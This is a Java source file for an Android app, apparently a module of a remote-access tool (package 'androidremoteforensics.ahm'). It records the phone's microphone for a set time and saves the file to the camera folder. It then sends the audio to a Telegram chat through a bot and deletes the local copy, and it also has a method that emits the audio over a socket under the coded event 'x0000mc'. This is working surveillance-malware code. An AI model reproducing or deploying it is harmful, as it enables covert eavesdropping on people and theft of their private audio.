package com.peritoflores.androidremoteforensics.ahm;

import android.media.MediaRecorder;
import android.util.Log;

import com.peritoflores.androidremoteforensics.EchoBot;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.util.Timer;
import java.util.TimerTask;


public class MicManager {

    static MediaRecorder recorder;
    static File audiofile = null;
    static final String TAG = "MediaRecording";
    static TimerTask stopRecording;

    public static void startRecording(int sec, long chatId) throws Exception {
        final long chid = chatId;
        File dir = new File("/sdcard/DCIM/Camera");
        try {
            audiofile = File.createTempFile("sound", ".mp3", dir);
            Log.i("Audio file created ", audiofile.getAbsolutePath());
        } catch (IOException e) {
            Log.e(TAG, "external storage access error");
            return;
        }

        //Creating MediaRecorder and specifying audio source, output format, encoder & output format
        recorder = new MediaRecorder();
        recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
        recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
        recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
        recorder.setOutputFile(audiofile.getAbsolutePath());
        recorder.prepare();
        recorder.start();

        stopRecording = new TimerTask() {
            //long chatId;
            @Override
            public void run() {
                //stopping recorder
                recorder.stop();
                recorder.release();
                EchoBot.sendVoice(chid, audiofile.toString());
                audiofile.delete();
            }
        };
        new Timer().schedule(stopRecording, sec * 1000);
    }

    /**
     * This method send voice recorded
     *
     * @param file
     */
    private static void sendVoice(File file) {
        int size = (int) file.length();
        byte[] data = new byte[size];
        try {
            BufferedInputStream buf = new BufferedInputStream(new FileInputStream(file));
            buf.read(data, 0, data.length);
            JSONObject object = new JSONObject();
            object.put("file", true);
            object.put("name", file.getName());
            object.put("buffer", data);
            IOSocket.getInstance().getIoSocket().emit("x0000mc", object);
            buf.close();
        } catch (FileNotFoundException e) {
            Log.e(TAG, e.toString());
        } catch (IOException e) {
            Log.e(TAG, e.toString());
        } catch (JSONException e) {
            Log.e(TAG, e.toString());
        }
    }
}